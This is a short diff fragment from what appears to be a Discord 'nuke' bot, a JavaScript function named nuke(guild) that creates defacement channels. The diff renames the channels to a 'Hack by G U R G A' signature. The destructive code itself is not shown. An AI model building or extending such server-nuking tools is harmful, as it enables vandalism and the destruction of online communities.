@@ -616,9 +616,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('LINK E SERVERA NUEYAKAT BNERA', 'text');
+    await guild.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'text');
  
-      await guild.createChannel('Hazm le nia blem create server bka', 'voice');
+      await guild.createChannel('Hack by G̷ U̷ R̷ G̷ A̷ 🛠', 'voice');
  
  
  
